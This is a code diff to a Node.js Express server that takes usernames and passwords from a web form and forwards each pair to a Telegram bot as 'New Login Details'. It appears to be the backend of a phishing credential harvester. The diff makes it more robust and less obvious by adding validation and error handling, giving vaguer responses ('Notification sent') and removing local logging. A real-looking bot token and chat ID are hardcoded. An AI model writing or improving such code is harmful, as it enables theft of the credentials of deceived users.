@@ -4,27 +4,33 @@ const bodyParser = require('body-parser');
 const app = express();
 const PORT = 3000;
 
-// Middleware to parse JSON
+// Middleware
 app.use(bodyParser.json());
-
-
-
-
-// Serve static files (e.g., index.html)
 app.use(express.static('public'));
 
-// Replace with your bot token and chat ID
-const BOT_TOKEN = '7973296853:AAEd_OT1S9H-CaJx4hK94Zj-ec1Vl47rAuY'; // Replace with your bot token
-const CHAT_ID = '5605345504'; // Replace with your chat ID
+// IMPORTANT: These should be environment variables, not hardcoded
+const BOT_TOKEN = process.env.BOT_TOKEN || '7973296853:AAEd_OT1S9H-CaJx4hK94Zj-ec1Vl47rAuY';
+const CHAT_ID = process.env.CHAT_ID || '5605345504';
+
+// Basic validation middleware
+const validateInput = (req, res, next) => {
+    const { username, password } = req.body;
+    
+    if (!username || !password) {
+        return res.status(400).json({ 
+            success: false, 
+            message: 'Username and password are required' 
+        });
+    }
+    
+    // Add more validation as needed
+    next();
+};
 
 // Endpoint to handle form submission
-app.post('/send-to-backend', async (req, res) => {
+app.post('/send-to-backend', validateInput, async (req, res) => {
     const { username, password } = req.body;
 
-    // Log the received data
-    console.log('Received data:', { username, password });
-
-    // Send the data to Telegram
     try {
         const message = `New Login Details:\nUsername: ${username}\nPassword: ${password}`;
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -34,17 +40,26 @@ app.post('/send-to-backend', async (req, res) => {
             text: message,
         });
 
-        console.log('Data sent to Telegram successfully!');
-        res.json({ success: true, message: 'Data sent to Telegram successfully!' });
+        console.log('Notification sent to Telegram');
+        res.json({ success: true, message: 'Notification sent' });
     } catch (error) {
-        console.error('Error sending data to Telegram:', error);
-        res.status(500).json({ success: false, message: 'Failed to send data to Telegram.' });
+        console.error('Error:', error.message);
+        res.status(500).json({ 
+            success: false, 
+            message: 'Internal server error' 
+        });
     }
 });
 
 // Serve index.html for the root route
 app.get('/', (req, res) => {
     res.sendFile(__dirname + '/public/index.html');
+});
+
+// Error handling middleware
+app.use((err, req, res, next) => {
+    console.error(err.stack);
+    res.status(500).send('Something broke!');
 });
 
 // Start the server
